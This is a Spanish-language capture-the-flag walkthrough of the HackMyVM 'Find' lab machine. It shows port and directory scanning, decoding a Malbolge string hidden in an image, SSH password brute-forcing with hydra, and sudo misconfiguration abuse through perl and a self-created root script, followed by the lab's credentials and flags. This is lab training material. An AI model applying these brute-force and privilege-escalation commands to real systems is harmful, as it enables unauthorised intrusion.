---
icon: flag
---

# Find HackMyVM (Easy - Linux)

## Escaneo de puertos

```shell
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn <IP>
```

```shell
nmap -sCV -p<PORTS> <IP>
```

Info:

```
Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-24 03:15 EDT
Nmap scan report for 192.168.5.28
Host is up (0.00062s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 6e:f7:90:04:84:0d:cd:1e:5d:2e:da:b1:51:d9:bf:57 (RSA)
|   256 39:5a:66:38:f7:64:9a:94:dd:bc:b6:fb:f8:e7:3f:87 (ECDSA)
|_  256 8c:26:e7:26:62:77:16:40:fb:b5:cf:a6:1c:e0:f6:9d (ED25519)
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
|_http-title: Apache2 Debian Default Page: It works
|_http-server-header: Apache/2.4.38 (Debian)
MAC Address: 08:00:27:17:13:3F (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.87 seconds
```

Veremos que hay un puerto `80` en el que contendra una pagina web, si entramos veremos simplemente una pagina web por defecto de `apache2` por lo que vamos a realizar un poco de `fuzzing` a ver que encontramos.

## Gobuster

```shell
gobuster dir -u http://<IP>/ -w <WORDLIST> -x html,php,txt -t 50 -k -r
```

Info:

```
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.5.28/
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              html,php,txt
[+] Follow Redirect:         true
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.html                (Status: 403) [Size: 277]
/index.html           (Status: 200) [Size: 10701]
/manual               (Status: 200) [Size: 626]
/robots.txt           (Status: 200) [Size: 13]
/.html                (Status: 403) [Size: 277]
Progress: 312820 / 882244 (35.46%)^C
[!] Keyboard interrupt detected, terminating.
Progress: 313164 / 882244 (35.50%)
===============================================================
Finished
===============================================================
```

Pero no veremos gran cosa, vamos a probar con las extensiones a ver si encontramos algo.

## Escalate user missyred

```shell
gobuster dir -u http://<IP>/ -w <WORDLIST> -x html,php,txt,jpg,png -t 50 -k -r
```

Info:

```
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.5.28/
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              txt,jpg,png,html,php
[+] Follow Redirect:         true
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.html                (Status: 403) [Size: 277]
/index.html           (Status: 200) [Size: 10701]
/cat.jpg              (Status: 200) [Size: 35137]
/manual               (Status: 200) [Size: 626]
/robots.txt           (Status: 200) [Size: 13]
/.html                (Status: 403) [Size: 277]
/server-status        (Status: 403) [Size: 277]
Progress: 1323360 / 1323366 (100.00%)
===============================================================
Finished
===============================================================
```

Veremos que si probamos con dichas extensiones enseguida vamos a ver algo bastante interesante llamado `cat.jpg`, vamos a ver que contiene por lo que nos lo vamos a descargar.

```shell
curl -O http://<IP>/cat.jpg
```

Si leemos la imagen a lo ultimo del contenido veremos esto que no parece que sea de la imagen, parece que sea algo puesto a mano.

```
>C<;_"!~}|{zyxwvutsrqponmlkjihgfedcba`_^]\[ZYXWVUTSRQPONMLKJ`_dcba`_^]\Uy<XW
VOsrRKPONGk.-,+*)('&%$#"!~}|{zyxwvutsrqponmlkjihgfedcba`_^]\[ZYXWVUTSRQPONML
KJIHGFEDZY^W\[ZYXWPOsSRQPON0Fj-IHAeR
```

Vamos a probar a decodificarlo a ver que vemos, en este caso esta codificado en un lenguaje de programacion muy antiguo y muy poco utilizado el cual hasta el que lo creo decidio hacerlo con la intencion de que fuera imposible practicamente programarlo o entenderlo, es el llamado `Malbolge` y despues de buscar un rato encontre esta pagina que te lo decodifica.

URL = [Decode Interpreter Malbolge](https://malbolge.doleczek.pl/)

> Codigo decodificado

```
missyred
```

Vemos que nos da un usuario por lo que vamos a probar a tirarle `fuerza bruta` a ver que encontramos.

### Hydra

```shell
hydra -l missyred -P <WORDLIST> ssh://<IP> -t 64 -I
```

Info:

```
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-05-24 03:44:20
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[WARNING] Restorefile (ignored ...) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 64 tasks per 1 server, overall 64 tasks, 14344399 login tries (l:1/p:14344399), ~224132 tries per task
[DATA] attacking ssh://192.168.5.28:22/
[22][ssh] host: 192.168.5.28   login: missyred   password: iloveyou
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 21 final worker threads did not complete until end.
[ERROR] 21 targets did not resolve or could not be connected
[ERROR] 0 target did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-05-24 03:44:27
```

Veremos que hemos encontrados una credenciales las cuales vamos a probar por `SSH` a ver si funcionan.

### SSH

```shell
ssh missyred@<IP>
```

Metemos como contraseña `iloveyou` y veremos que estamos dentro.

## Escalate user kings

Si hacemos `sudo -l` veremos lo siguiente:

```
Matching Defaults entries for missyred on find:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User missyred may run the following commands on find:
    (kings) /usr/bin/perl
```

Veremos que podremos ejecutar el binario `perl` como el usuario `kings` por lo que haremos lo siguiente:

```shell
sudo -u kings perl -e 'exec "/bin/bash";'
```

Info:

```
kings@find:/home/missyred$ whoami
kings
```

Vamos a leer la `flag` del usuario.

> user.txt

```
f4e690f638c01bd8a19fb1349d40519c
```

## Escalate Privileges

Si hacemos `sudo -l` veremos lo siguiente:

```
Matching Defaults entries for kings on find:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User kings may run the following commands on find:
    (ALL) NOPASSWD: /opt/boom/boom.sh
```

Veremos que podemos ejecutar el script de `/opt` como el usuario `root` vamos a ver que permisos tiene o que contiene dicho script.

Si nos vamos a la carpeta `/opt` veremos que no hay nada, por lo que podremos realizar lo siguiente para ser el usuario `root`.

```shell
mkdir /opt/boom
cd /opt/boom
nano /opt/boom/boom.sh

#Dentro del nano
#!/bin/bash

echo "Obtieniendo una shell como root..."
/bin/bash
```

Ahora le establecemos los permisos necesarios de ejecuccion.

```shell
chmod +x /opt/boom/boom.sh
```

Ahora vamos a ejecutarlo de la siguiente forma:

```shell
sudo /opt/boom/boom.sh
```

Info:

```
Obtieniendo una shell como root...
root@find:/opt/boom# whoami
root
```

Con esto veremos que ya seremos `root` por lo que vamos a leer la `flag` de `root`.

> root.txt

```
c8aaf0f3189e000006c305bbfcbeb790
```
